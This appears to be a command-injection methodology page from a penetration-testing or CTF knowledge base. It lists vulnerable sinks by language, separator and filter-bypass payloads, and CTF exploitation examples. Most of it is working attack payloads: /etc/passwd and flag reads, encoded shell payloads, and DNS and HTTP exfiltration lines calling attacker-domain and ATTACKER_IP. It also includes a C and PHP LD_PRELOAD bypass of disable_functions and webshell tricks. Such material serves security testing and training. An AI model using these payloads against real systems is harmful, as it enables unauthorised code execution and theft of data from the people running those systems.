# Command Injection

## Trigger

Load the Command Injection methodology when the application passes user input into any of these:

**Input parameters funneling into system commands:**
- `?cmd=`, `?exec=`, `?run=`, `?command=`, `?action=`, `?operation=`
- Hostname, IP, domain fields that get pinged or resolved
- Filename or path inputs for file operations (tar, zip, wget, curl)
- DNS lookup / whois / dig interfaces
- Network diagnostic forms (ping, traceroute, nslookup)
- Image processing fields (ImageDescription, Artist, Software in EXIF metadata)
- Date/time format inputs passed to `date` command
- Perl CGI with 2-argument `open()` on user-controlled paths
- Legacy `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()` in PHP
- `Runtime.exec()` or `ProcessBuilder` in Java with single-string argument
- `os.system()`, `os.popen()`, `subprocess.*(shell=True)` in Python
- `eval` / `exec` / `compile` in Python; `eval()` / `assert()` / `create_function()` in PHP
- Backtick operator `cmd` or `$()` in shell interpolation contexts

---

## Attack Surface

Target characteristics that indicate command injection potential:

- **Language-identified sinks:** PHP (`system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`, `eval`, `assert`, `create_function`, `preg_replace` `/e` modifier), Python (`os.system`, `os.popen`, `subprocess.call` with `shell=True`, `eval`, `exec`), Java (`Runtime.exec` with single String, `ProcessBuilder` with unvalidated input), Ruby (`Kernel#open('|cmd')`, `instance_eval`, `%x[cmd]`, `Process.spawn`), Perl (2-arg `open` with pipe character)
- **Output is not reflected** (blind injection) -- requires time-based, DNS, or OOB confirmation
- **Input validation exists but is regex-based** without proper anchoring (no trailing `$` or `\z`)
- **Space filtering** that can be bypassed with `${IFS}`, tab, or brace expansion
- **Character-level filtering** that misses encoded variants (base64, hex, octal) or shell metacharacters like backtick and `$()`
- **File uploads + archive extraction** where archive filenames contain shell metacharacters
- **Image upload** where EXIF metadata (ImageDescription, Artist) flows unescaped into exiftool commands
- **`date` command invocation** where `-f` flag reads arbitrary files

---

## Decision Tree

1. **Identify the injection point and the command wrapper**
   - Determine if input goes into `exec()`, `system()`, `Runtime.exec()`, `subprocess.call(shell=True)`, etc.
   - Test with a harmless command separator and observe behavior

2. **Attempt basic command separators**
   ```
   input; echo test
   input| echo test
   input && echo test
   input || echo test
   `echo test`
   $(echo test)
   %0aecho test (URL-encoded newline)
   ```

3. **Determine visibility**
   - **Visible output:** Apply filters to extract command output from the response
   - **Blind:** Use time-based (sleep), DNS exfiltration, or HTTP callback

4. **Map the filter surface**
   - Are spaces blocked? Try `${IFS}`, `%09`, `{cmd,arg}`, `cat<file`
   - Are keywords blocked? Try quote insertion, backslash, wildcards, hex
   - Are special chars blocked? Try encoded alternatives

5. **Escalate to RCE**
   - Use detected bypasses to construct a working payload
   - For blind scenarios, use `curl`/`wget` callback or `nslookup` DNS exfiltration
   - For restricted shells, use environment variable manipulation (LD_PRELOAD, PATH hijacking)

---

## Techniques

### Command Separators

```bash
# Sequential execution (always runs)
input; id

# Conditional on success
input && id

# Conditional on failure
input || id

# Pipe output
input | id

# Newline (URL-encoded)
input%0aid

# Backtick command substitution
input`id`

# Dollar-parenthesis command substitution
input$(id)

# Windows-specific
input&id        # Command separator in cmd.exe
input|id        # Pipe in cmd.exe
input&&id       # Conditional in cmd.exe
```

### Dangerous Functions by Language

**PHP:**
```php
system("ping $input");         // Executes via shell, output returned
exec("ping $input", $output);  // Last line returned
shell_exec("ping $input");     // Via shell, full output
passthru("ping $input");       // Binary output passthrough
popen("ping $input", 'r');     // Process file pointer
proc_open("ping $input", ...); // Process control
eval("$input_code");           // PHP code execution (CWE-94)
assert("strpos('$input', '..') === false");  // String eval (PHP < 7.2)
preg_replace("/$pattern/e", ...);           // /e modifier eval (PHP < 7)
create_function('$a', "return $input;");    // String eval (PHP < 8)
`$input`;                       // Backtick = shell_exec in PHP
```

**Python:**
```python
os.system(f"ping {input}")        # Shell execution
os.popen(f"ping {input}")         # Opens pipe to shell
subprocess.call(f"ping {input}", shell=True)   # Shell interpretation
subprocess.Popen(f"ping {input}", shell=True)  # Shell interpretation
eval(input)                       # Python code execution
exec(input)                       # Python code execution
```

**Java:**
```java
// DANGEROUS: Single-string exec uses StringTokenizer, splits on spaces
Runtime.getRuntime().exec("ping " + input);

// SAFER: ProcessBuilder with string array
new ProcessBuilder("ping", input).start();
```

**Ruby:**
```ruby
open("|" + input)       # Pipe-to-open executes shell commands
exec(input)             # Replaces process
system(input)           # Shell execution
%x[#{input}]            # Shell execution via backtick equivalent
Process.spawn(input)    # Spawns process
instance_eval(input)    # Code evaluation
```

### Blind Command Injection Detection

```bash
# Time-based detection
input; sleep 5
input && sleep 5
input| ping -c 5 127.0.0.1

# DNS exfiltration
input; nslookup $(id).attacker-domain.com
input && nslookup $(cat /flag).attacker-domain.com
# Monitor DNS queries to attacker-domain.com for the output

# HTTP callback
input; curl http://attacker-domain:9090/$(id)
input && wget --post-data="$(cat /flag)" http://attacker-domain:9090/

# File creation oracle (if file is accessible via web)
input; echo "test" > /var/www/html/poc.txt
input && touch /tmp/poc-$(id).txt
```

### Space Bypass Techniques

```bash
# $IFS (Internal Field Separator)
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# Tab character (%09)
cat%09/etc/passwd

# Brace expansion
{cat,/etc/passwd}
{ls,-la,/}
{base64,-d,/tmp/payload.b64}

# Input redirection
cat</etc/passwd
</etc/passwd cat

# Variable with IFS override
IFS=,;`cat<<<uname,-a`
```

### Keyword Bypass Techniques

```bash
# Quote insertion (shell ignores empty quotes in words)
c'a't /etc/pa''sswd
"ca"t /etc/passwd
/usr/bin/c""at /etc/passwd

# Backslash escaping (within command names)
c\at /etc/passwd
/usr/bin/c\at /etc/passwd

# Wildcard / globbing
/???/???/c?t /etc/passwd
cat /e?c/pa??wd
/usr/bin/c* /etc/p*wd

# Variable construction
a=ca;b=t; $a$b /etc/passwd
c="c";d="at"; $c$d /etc/passwd

# Environment variable manipulation
${PATH:0:1}at /etc/passwd
/usr/$(echo bin)/cat /etc/passwd

# Brace expansion for arguments
{cat,/etc/passwd}
```

### Encoding-Based Payloads

```bash
# Base64 decode to shell
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh
echo 'cat /etc/passwd' | base64 | base64 -d | sh

# Hex decoding
echo '636174202f6574632f706173737764' | xxd -r -p | sh
printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | sh

# Octal representation
$'\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144'
# Decodes to: cat /etc/passwd

# Combined hex + eval
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
```

### Real-World Exploitation Examples

**Bash brace expansion for space-free injection (Insomnihack 2016):**
```bash
# When spaces, $, &, \, ;, |, and * are all filtered
{ls,-la,/}
<({ls,-la,/}>/dev/udp/ATTACKER_IP/53)
<({base64,-d,/tmp/payload}>/tmp/s.sh)
```

**PHP backtick eval under character limit (EasyCTF 2017):**
```php
// 12-char RCE via eval()
echo`cat *`;

// 11-char parameterized (bypasses length limit)
`$_GET[0]`;

// Only 9 chars
echo`ls`;
```

**PHP create_function RCE (FireShell 2019):**
```text
# Server code: create_function('$a, $b', 'return strcmp($a->'.$order.', $b->'.$order.');')
order=;system($_GET[c]);return 0;//
&c=id
```

**EXIF ImageDescription shell injection (OTW Advent 2018):**
```bash
exiftool -ImageDescription="Santa ; /bin/bash -c 'cat /opt/flag > /tmp/out'" evil.jpg
# Upload evil.jpg -- server pipes ImageDescription into shell command
```

**Tar filename command injection (CyberSecurityRumble 2016):**
```bash
mkdir exploit && cd exploit
touch 'name; cat /flag #'
tar cf exploit.tar *
# Upload tar -- server echoes filename in CGI context, executes injected command
```

**Unanchored regex command injection (picoCTF 2018):**
```php
// preg_match('/^(\d{1,3}\.){3}\d{1,3}/', $_GET['ip'])
// Missing trailing $ allows: 1.1.1.1;cat /flag.txt
```

**Ruby instance_eval breakout:**
```ruby
# Template: apply_METHOD('VALUE')
# Inject VALUE as: valid');PAYLOAD#
# Result: apply_METHOD('valid');PAYLOAD#')
```

**PHP assert() string eval (CSAW CTF 2016):**
```text
# Vulnerable: assert("strpos('$page', '..') === false");
# Injection:  ?page=' and die(show_source('templates/flag.php')) or '
```

**PHP eval function-regex bypass via getallheaders() (RCTF 2018):**
```bash
# Sandbox regex: /[^\W_]+\((?R)?\)/ only allows single function calls
# Bypass: eval(current(getallheaders()));
# Pass command in custom header:
curl "http://target/?cmd=eval(current(getallheaders()));" \
     -H "Zzz: system('cat /flag');"
```

**MySQL client LOAD DATA LOCAL file read via rogue server (VolgaCTF 2018):**
When SSRF reaches a MySQL server and the client has `LOAD DATA LOCAL` enabled, the server can request arbitrary files from the client regardless of the query. The rogue MySQL server sends a file transfer request packet in response to any client query.

**LD_PRELOAD bypass of PHP disable_functions (ALICTF 2016):**
```c
// Compile: gcc -shared -fPIC -o evil.so evil.c -ldl
// PHP mail() calls sendmail which respects LD_PRELOAD
void payload(char *cmd) {
    char buf[512];
    snprintf(buf, sizeof(buf), "%s > /tmp/_output.txt", cmd);
    system(buf);
}
int geteuid() {
    if (getenv("LD_PRELOAD") == NULL) return 0;
    unsetenv("LD_PRELOAD");
    char *cmd = getenv("_evilcmd");
    if (cmd) payload(cmd);
    return 1;
}
```
```php
<?php
putenv("LD_PRELOAD=/var/www/evil.so");
putenv("_evilcmd=" . $_GET['cmd']);
mail("x@x.x", "", "", "");
show_source("/tmp/_output.txt");
?>
```

**BMP pixel webshell via filename truncation (Nuit du Hack CTF 2018):**
Encode PHP code as BMP pixel colors (BGR format). Name the file `'A'*46 + '.php' + '.JPG'` -- the server validates the `.JPG` extension but truncates to 50 characters, leaving `'A'*46 + '.php'`.

---

## Bypass

| Filter Type | Bypass Technique |
|---|---|
| Spaces blocked | `${IFS}`, tab `%09`, brace expansion `{cmd,arg}`, input redirection `cat<file` |
| Semicolon blocked | Newline `%0a`, pipe `\|`, conditional `&&` `\|\|`, backtick `` ` ``, `$()` |
| Keywords blocked | Quote insertion `c'a't`, backslash `c\at`, wildcards `/?/c?t`, variable `$a$b` |
| `$` blocked | Backtick substitution `` `cmd` ``, command substitution without `$` unavailable -- use pipe or encoding |
| Backtick blocked | `$()` command substitution |
| Parentheses blocked | Use `{cmd,args}` brace expansion or `xargs` with pipe |
| Metacharacters blocked | Base64 + decode pipe, hex encode, octal escape sequences |
| `exec`/`system` blocked (PHP) | LD_PRELOAD via `mail()`, filesystem functions (`file_get_contents`, `scandir`) |
| `exec`/`system` blocked (Python) | `__import__('os').system()`, ctypes, `subprocess` with list args |
| Single-char encoding filter | Use `printf` with octal escape or `xxd -r -p` with hex |
| Length limit (eval) | Backtick with `$_GET[0]` to move payload to URL parameter |
| Regex unanchored (`^pattern` missing `$`) | Append separator + command after valid prefix |

---

## Verification

1. **Visible output:** The command output appears in the HTTP response. Confirm by running `id` to see `uid=` in the response, or `ls` to verify directory listing.

2. **Time-based (blind):** `sleep 5` causes a measurable 5-second response delay. Test multiple times with and without sleep to rule out network jitter. Use `ping -c 5 127.0.0.1` for a more consistent delay.

3. **DNS callback (blind):** `nslookup $(whoami).attacker-domain.com` -- the OOB DNS server receives a query containing the command output. Verify the subdomain contains the expected output value.

4. **HTTP callback (blind):** `curl http://attacker-domain:9090/$(id)` -- the OOB HTTP server receives a request with the command output in the URL path.

5. **File creation:** Write to a web-accessible directory and verify via HTTP: `echo "injected" > /var/www/html/poc.txt` then `curl http://target/poc.txt`.

6. **Error message leakage:** Some applications return error messages containing command output. For example, `date -f /etc/passwd` outputs file content in error messages.

---

## Pitfalls

See [Web Payloads](../../payloads/web/index.md) for tested command injection payloads.

- **Java `Runtime.exec()` uses `StringTokenizer`** on the command string, so arguments with spaces are split incorrectly. Always use the `String[]` overload to avoid shell interpretation issues -- but this also means pipe, redirect, and shell metacharacters do NOT work in `Runtime.exec(String)`. You must build the full command array or use `/bin/sh -c` to get shell features.
- **Python `subprocess.call(cmd, shell=True)`** is the dangerous variant. Without `shell=True`, the command is executed directly with no shell interpretation -- metacharacters are passed as literal arguments.
- **PHP `system()` vs `exec()`:** `system()` outputs directly and returns the last line; `exec()` captures output in an array parameter. Both execute through `/bin/sh -c`.
- **Space bypasses can break arguments.** `${IFS}` works in bash but not in simpler shells (`sh` on some systems). Always test the specific shell environment.
- **Blind injection without OOB confirmation** can produce false positives from coincidental timing variation. Always pair time-based tests with DNS or HTTP callbacks.
- **LD_PRELOAD requires `mail()` or `error_log()`** to trigger an external process. If `putenv()` is disabled, this bypass is unavailable.
- **Backtick in PHP** has the same operator precedence as `shell_exec()`. In a string context, backticks are not evaluated inside single-quoted strings.
- **EXIF injection requires the server to actually run `exiftool`** after upload, not just store the metadata. Read the source to confirm the processing pipeline.
- **Newlines in HTTP headers** (`%0a`) may be stripped or blocked by the web server or WAF before reaching the backend command. Test URL-encoded and raw variants.
